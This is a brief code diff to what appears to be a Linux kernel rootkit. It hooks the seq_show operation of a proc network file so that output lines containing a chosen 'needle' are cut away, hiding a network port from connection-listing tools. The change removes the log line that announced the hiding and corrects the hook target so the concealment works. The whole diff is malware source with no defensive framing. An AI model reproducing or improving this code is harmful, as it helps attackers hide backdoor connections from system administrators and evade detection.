@@ -239,8 +239,6 @@ int hooked_seq_show(struct seq_file *seq, void *v){
     ret = kernel_seq_show(seq, v);
 
     if (strnstr(seq->buf + seq->count - 150, needle, 150)) {
-        fm_alert("Hiding port %d using needle %s.\n",
-                 port, needle);
         seq->count -= 150;
     }
 
@@ -256,8 +254,8 @@ static void hook_port(void){
         return;                               
     } 
     afinfo = PDE_DATA(filp->f_path.dentry->d_inode); 
-    kernel_seq_show = afinfo->seq_ops.op;                         
-    afinfo->seq_ops.op = hooked_seq_show;                         
+    kernel_seq_show = afinfo->seq_ops.show;                         
+    afinfo->seq_ops.show = hooked_seq_show;                         
                                                      
     filp_close(filp, 0);                               
               
